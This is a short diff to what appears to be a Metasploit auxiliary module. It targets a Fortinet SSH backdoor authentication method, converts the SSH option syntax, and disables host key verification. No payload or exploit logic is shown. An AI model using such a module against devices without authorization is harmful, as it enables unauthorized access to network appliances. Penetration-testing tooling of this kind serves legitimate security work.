@@ -48,14 +48,15 @@ class MetasploitModule < Msf::Auxiliary
     factory = ssh_socket_factory
 
     ssh_opts = {
-      port:            rport,
+      :port            => rport,
       # The auth method is converted into a class name for instantiation,
       # so fortinet-backdoor here becomes FortinetBackdoor from the mixin
-      auth_methods:    ['fortinet-backdoor'],
-      non_interactive: true,
-      config:          false,
-      use_agent:       false,
-      proxy:           factory
+      :auth_methods    => ['fortinet-backdoor'],
+      :non_interactive => true,
+      :config          => false,
+      :use_agent       => false,
+      :proxy           => factory,
+      :verify_host_key => :never
     }
 
     ssh_opts.merge!(verbose: :debug) if datastore['SSH_DEBUG']
